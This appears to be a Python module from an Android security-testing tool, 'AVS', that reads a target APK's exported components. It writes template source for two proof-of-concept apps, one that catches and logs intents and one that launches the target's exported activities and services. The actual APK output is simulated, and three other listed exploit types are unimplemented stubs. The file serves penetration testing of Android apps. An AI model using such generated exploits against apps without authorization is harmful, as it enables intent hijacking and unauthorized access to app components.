#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit Generator module for AVS
Handles the creation of exploit APKs for testing vulnerabilities
"""

import os
import shutil
import tempfile
import subprocess
from rich.console import Console
from androguard.core.bytecodes.apk import APK

console = Console()

class ExploitGenerator:
    """Class to handle creation of exploit APKs"""
    
    def __init__(self, apk_path):
        """Initialize ExploitGenerator with APK path"""
        self.apk_path = apk_path
        self.temp_dir = None
        self.exploits = {
            "intent_redirection": {
                "name": "Intent Redirection Exploit",
                "template": "intent_redirection_template.apk",
                "description": "Creates an APK that can hijack intents from the target application"
            },
            "exported_components": {
                "name": "Exported Components Exploit",
                "template": "exported_components_template.apk",
                "description": "Creates an APK that can access exported components from the target application"
            },
            "webview_javascript": {
                "name": "WebView JavaScript Exploit",
                "template": "webview_js_template.apk",
                "description": "Creates an APK that can inject JavaScript into WebViews of the target application"
            },
            "sql_injection": {
                "name": "SQL Injection Exploit",
                "template": "sql_injection_template.apk",
                "description": "Creates an APK that can perform SQL injection attacks on the target application"
            },
            "broadcast_theft": {
                "name": "Broadcast Theft Exploit",
                "template": "broadcast_theft_template.apk",
                "description": "Creates an APK that can intercept broadcasts from the target application"
            }
        }
    
    def _setup_workspace(self):
        """Set up a temporary workspace for exploit creation"""
        self.temp_dir = tempfile.mkdtemp(prefix="avs_exploit_")
        console.print(f"[bold blue]Created temporary workspace: {self.temp_dir}[/bold blue]")
        return self.temp_dir
    
    def _cleanup_workspace(self):
        """Clean up the temporary workspace"""
        if self.temp_dir and os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
            console.print("[bold blue]Cleaned up temporary workspace[/bold blue]")
    
    def _get_target_info(self):
        """Get information about the target APK"""
        try:
            apk = APK(self.apk_path)
            info = {
                "package_name": apk.get_package(),
                "activities": [a for a in apk.get_activities()],
                "services": [s for s in apk.get_services()],
                "receivers": [r for r in apk.get_receivers()],
                "providers": [p for p in apk.get_providers()],
                "permissions": apk.get_permissions()
            }
            
            # Get exported components
            info["exported_activities"] = [a for a in apk.get_activities() if apk.get_export_value(a)]
            info["exported_services"] = [s for s in apk.get_services() if apk.get_export_value(s)]
            info["exported_receivers"] = [r for r in apk.get_receivers() if apk.get_export_value(r)]
            info["exported_providers"] = [p for p in apk.get_providers() if apk.get_export_value(p)]
            
            return info
        except Exception as e:
            console.print(f"[bold red]Error getting target APK info: {str(e)}[/bold red]")
            return None
    
    def _create_intent_redirection_exploit(self, target_info, output_path):
        """Create intent redirection exploit APK"""
        workspace = self._setup_workspace()
        
        try:
            # In a real implementation, this would use a template APK and modify it
            # Here we'll simulate the process
            
            # 1. Create a base directory structure for an Android app
            src_dir = os.path.join(workspace, "src", "main", "java", "com", "avs", "exploit")
            res_dir = os.path.join(workspace, "src", "main", "res", "layout")
            manifest_dir = os.path.join(workspace, "src", "main")
            
            os.makedirs(src_dir, exist_ok=True)
            os.makedirs(res_dir, exist_ok=True)
            os.makedirs(manifest_dir, exist_ok=True)
            
            # 2. Create a Java activity that will hijack intents
            java_code = f"""package com.avs.exploit;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class IntentHijackerActivity extends Activity {{
    private static final String TAG = "IntentHijacker";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Intent intent = getIntent();
        if (intent != null) {{
            Log.d(TAG, "Hijacked intent: " + intent.toString());
            // Extract data from intent
            Bundle extras = intent.getExtras();
            if (extras != null) {{
                for (String key : extras.keySet()) {{
                    Log.d(TAG, "Extra: " + key + " = " + extras.get(key));
                }}
            }}
        }}
    }}
}}
"""
            
            # 3. Create a simple layout
            layout_xml = """<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical">

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Intent Hijacker"
        android:textSize="24sp"
        android:padding="16dp" />

</LinearLayout>
"""
            
            # 4. Create AndroidManifest.xml that registers for the same intents as the target app
            manifest_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.avs.exploit">

    <application
        android:allowBackup="true"
        android:label="AVS Intent Hijacker"
        android:theme="@android:style/Theme.DeviceDefault">

        <activity android:name=".IntentHijackerActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
"""
            
            # Add intent filters for each exported activity in the target app
            for activity in target_info.get("exported_activities", []):
                manifest_xml += f"""
            <!-- Hijack intents for {activity} -->
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:scheme="content" />
                <data android:scheme="file" />
            </intent-filter>
"""
            
            manifest_xml += """
        </activity>
    </application>
</manifest>
"""
            
            # 5. Write files
            with open(os.path.join(src_dir, "IntentHijackerActivity.java"), "w") as f:
                f.write(java_code)
                
            with open(os.path.join(res_dir, "activity_main.xml"), "w") as f:
                f.write(layout_xml)
                
            with open(os.path.join(manifest_dir, "AndroidManifest.xml"), "w") as f:
                f.write(manifest_xml)
            
            # In a real implementation, this would compile the code with gradle/Android SDK
            # and generate an APK. For this example, we'll just create a placeholder file
            
            if not output_path:
                output_path = os.path.join(os.path.dirname(self.apk_path), 
                                          f"intent_redirection_exploit_{os.path.basename(self.apk_path)}")
            
            # Simulate APK creation
            with open(output_path, "w") as f:
                f.write("# This is a simulated exploit APK for intent redirection\n")
                f.write(f"# Target package: {target_info['package_name']}\n")
                f.write("# To build a real APK, you would need to compile this project with Gradle\n")
            
            console.print(f"[bold green]Created intent redirection exploit template at:[/bold green] {output_path}")
            console.print("[yellow]Note: This is a template that needs to be compiled with the Android SDK to create a real APK[/yellow]")
            
            return output_path
        
        except Exception as e:
            console.print(f"[bold red]Error creating exploit: {str(e)}[/bold red]")
            return None
        
        finally:
            self._cleanup_workspace()
    
    def _create_exported_components_exploit(self, target_info, output_path):
        """Create exported components exploit APK"""
        workspace = self._setup_workspace()
        
        try:
            # Similar implementation as intent redirection but focusing on accessing exported components
            src_dir = os.path.join(workspace, "src", "main", "java", "com", "avs", "exploit")
            res_dir = os.path.join(workspace, "src", "main", "res", "layout")
            manifest_dir = os.path.join(workspace, "src", "main")
            
            os.makedirs(src_dir, exist_ok=True)
            os.makedirs(res_dir, exist_ok=True)
            os.makedirs(manifest_dir, exist_ok=True)
            
            # Create main activity
            java_code = f"""package com.avs.exploit;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {{
    private static final String TAG = "ComponentExploit";
    private TextView logView;
    private LinearLayout buttonsLayout;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        logView = findViewById(R.id.log_view);
        buttonsLayout = findViewById(R.id.buttons_layout);
        
        // Add buttons for accessing exported components
        addExportedActivitiesButtons();
        addExportedServicesButtons();
        addExportedReceiversButtons();
        addExportedProvidersButtons();
    }}
    
    private void addExportedActivitiesButtons() {{
        addSectionHeader("Exported Activities");
"""
            
            # Add code to create buttons for each exported activity
            for i, activity in enumerate(target_info.get("exported_activities", [])):
                java_code += f"""
        addButton("Launch {activity.split('.')[-1]}", new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                try {{
                    Intent intent = new Intent();
                    intent.setComponent(new ComponentName("{target_info['package_name']}", "{activity}"));
                    startActivity(intent);
                    log("Launched activity: {activity}");
                }} catch (Exception e) {{
                    log("Error launching activity: " + e.getMessage());
                }}
            }}
        }});
"""
            
            java_code += """
    }
    
    private void addExportedServicesButtons() {
        addSectionHeader("Exported Services");
"""
            
            # Add code for services
            for i, service in enumerate(target_info.get("exported_services", [])):
                java_code += f"""
        addButton("Start {service.split('.')[-1]}", new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                try {{
                    Intent intent = new Intent();
                    intent.setComponent(new ComponentName("{target_info['package_name']}", "{service}"));
                    startService(intent);
                    log("Started service: {service}");
                }} catch (Exception e) {{
                    log("Error starting service: " + e.getMessage());
                }}
            }}
        }});
"""
            
            # Complete the Java class
            java_code += """
    }
    
    private void addExportedReceiversButtons() {
        addSectionHeader("Exported Broadcast Receivers");
        // Similar implementation for receivers
    }
    
    private void addExportedProvidersButtons() {
        addSectionHeader("Exported Content Providers");
        // Similar implementation for providers
    }
    
    private void addSectionHeader(String title) {
        TextView header = new TextView(this);
        header.setText(title);
        header.setTextSize(18);
        header.setPadding(0, 16, 0, 8);
        buttonsLayout.addView(header);
    }
    
    private void addButton(String text, View.OnClickListener listener) {
        Button button = new Button(this);
        button.setText(text);
        button.setOnClickListener(listener);
        buttonsLayout.addView(button);
    }
    
    private void log(String message) {
        Log.d(TAG, message);
        logView.append(message + "\\n");
    }
}
"""
            
            # Create a simple layout
            layout_xml = """<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp">

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Component Exploit"
        android:textSize="24sp"
        android:padding="8dp" />
        
    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:layout_weight="1">
        
        <LinearLayout
            android:id="@+id/buttons_layout"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical" />
    </ScrollView>
    
    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:layout_weight="1"
        android:background="#f0f0f0"
        android:layout_marginTop="16dp">
        
        <TextView
            android:id="@+id/log_view"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:padding="8dp"
            android:textSize="12sp"
            android:typeface="monospace" />
    </ScrollView>
</LinearLayout>
"""
            
            # Create AndroidManifest.xml
            manifest_xml = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.avs.exploit">

    <application
        android:allowBackup="true"
        android:label="AVS Component Exploit"
        android:theme="@android:style/Theme.DeviceDefault">

        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
"""
            
            # 5. Write files
            with open(os.path.join(src_dir, "MainActivity.java"), "w") as f:
                f.write(java_code)
                
            with open(os.path.join(res_dir, "activity_main.xml"), "w") as f:
                f.write(layout_xml)
                
            with open(os.path.join(manifest_dir, "AndroidManifest.xml"), "w") as f:
                f.write(manifest_xml)
            
            if not output_path:
                output_path = os.path.join(os.path.dirname(self.apk_path), 
                                          f"exported_components_exploit_{os.path.basename(self.apk_path)}")
            
            # Simulate APK creation
            with open(output_path, "w") as f:
                f.write("# This is a simulated exploit APK for exported components\n")
                f.write(f"# Target package: {target_info['package_name']}\n")
                f.write("# To build a real APK, you would need to compile this project with Gradle\n")
            
            console.print(f"[bold green]Created exported components exploit template at:[/bold green] {output_path}")
            console.print("[yellow]Note: This is a template that needs to be compiled with the Android SDK to create a real APK[/yellow]")
            
            return output_path
        
        except Exception as e:
            console.print(f"[bold red]Error creating exploit: {str(e)}[/bold red]")
            return None
        
        finally:
            self._cleanup_workspace()
    
    def generate_exploit(self, vulnerability_type, output_path=None):
        """Generate an exploit APK for the specified vulnerability type"""
        if vulnerability_type not in self.exploits:
            console.print(f"[bold red]Error:[/bold red] Unknown vulnerability type: {vulnerability_type}")
            console.print(f"[bold blue]Available vulnerability types:[/bold blue] {', '.join(self.exploits.keys())}")
            return None
        
        console.print(f"[bold green]Generating exploit for:[/bold green] {self.exploits[vulnerability_type]['name']}")
        console.print(f"[bold blue]Description:[/bold blue] {self.exploits[vulnerability_type]['description']}")
        
        # Get target APK info
        target_info = self._get_target_info()
        if not target_info:
            return None
        
        # Generate the appropriate exploit based on vulnerability type
        if vulnerability_type == "intent_redirection":
            return self._create_intent_redirection_exploit(target_info, output_path)
        elif vulnerability_type == "exported_components":
            return self._create_exported_components_exploit(target_info, output_path)
        elif vulnerability_type == "webview_javascript":
            console.print("[yellow]WebView JavaScript exploit generation not implemented in this demo[/yellow]")
            return None
        elif vulnerability_type == "sql_injection":
            console.print("[yellow]SQL Injection exploit generation not implemented in this demo[/yellow]")
            return None
        elif vulnerability_type == "broadcast_theft":
            console.print("[yellow]Broadcast theft exploit generation not implemented in this demo[/yellow]")
            return None
        else:
            console.print(f"[bold red]Error:[/bold red] Exploit generation for {vulnerability_type} not implemented")
            return None
